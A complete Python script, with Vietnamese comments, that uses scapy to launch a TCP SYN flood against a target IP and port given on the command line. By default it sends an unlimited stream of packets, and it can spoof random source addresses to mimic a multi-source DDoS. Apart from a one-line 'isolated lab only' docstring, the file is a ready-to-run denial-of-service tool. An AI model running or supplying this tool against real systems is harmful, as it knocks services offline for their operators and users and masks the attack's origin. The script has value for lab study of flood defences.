#!/usr/bin/env python3
"""SYN Flood (L4) - chi dung trong lab co lap."""
import sys, random, argparse
from scapy.all import IP, TCP, send, RandShort

def rand_ip():
    # gia mao source IP: mo phong DDoS nhieu nguon
    return "10.%d.%d.%d" % (random.randint(0,255), random.randint(0,255), random.randint(1,254))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")                       # IP victim
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--count", type=int, default=0, help="so goi, 0 = vo han")
    ap.add_argument("--spoof", action="store_true", help="gia mao source IP")
    args = ap.parse_args()

    sent = 0
    print("[*] SYN flood -> %s:%d (spoof=%s)" % (args.target, args.port, args.spoof))
    try:
        while args.count == 0 or sent < args.count:
            src = rand_ip() if args.spoof else None
            pkt = IP(src=src, dst=args.target) / TCP(sport=RandShort(), dport=args.port, flags="S", seq=random.randint(0, 2**32-1))
            send(pkt, verbose=0)
            sent += 1
            if sent % 500 == 0:
                print("[*] sent %d" % sent)
    except KeyboardInterrupt:
        pass
    print("[*] done, tong goi: %d" % sent)

if __name__ == "__main__":
    main()
